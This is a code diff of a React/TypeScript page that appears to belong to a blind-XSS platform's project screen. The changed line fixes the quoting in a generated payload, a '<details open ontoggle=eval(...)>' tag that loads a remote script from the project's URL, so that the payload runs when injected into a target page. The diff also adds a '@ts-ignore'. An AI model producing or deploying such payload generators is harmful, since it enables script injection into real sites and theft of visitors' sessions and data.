@@ -298,6 +298,7 @@ export default function ProjectPage() {
         }
     };
 
+    // @ts-ignore
     return (
         <PageContainer>
             <ProList<ProjectItem>
@@ -507,7 +508,7 @@ export default function ProjectPage() {
                                     name="projecturl_details"
                                     label="常规<details>标签代码"
                                     // readonly={true}
-                                    initialValue={"<details open ontoggle=eval(“appendChild(createElement(‘script’)).src=’//"+ row.projecturl + "'”) >"}
+                                    initialValue={"<details open ontoggle=eval("appendChild(createElement('script')).src='" + row.projecturl + "'") >"}
                                     disabled={true}
                                 />
                                 <ProFormText
